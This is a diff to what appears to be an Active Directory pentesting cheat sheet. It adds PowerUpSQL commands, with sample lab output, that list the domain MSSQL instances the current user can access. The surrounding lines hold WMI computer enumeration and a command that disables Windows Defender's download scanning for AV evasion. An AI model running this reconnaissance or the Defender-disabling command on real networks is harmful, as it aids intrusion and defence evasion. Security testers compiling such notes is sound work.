@@ -690,7 +690,16 @@ $computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | s
 
 foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }
 ```
+# Get MSSql db that current user have access to:
+```
+PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
 
+ComputerName                Instance                         Status
+------------                --------                         ------
+UFC-SQLDev.marvel.local    SQLDev.marvel.local,1433          Accessible
+UFC-SQLDev.marvel.local    SQLDev.marvel.local               Accessible
+
+```
 # AV Evasion with local admin:
 ```
 Set-MpPreference -DisableIOAVProtection $true
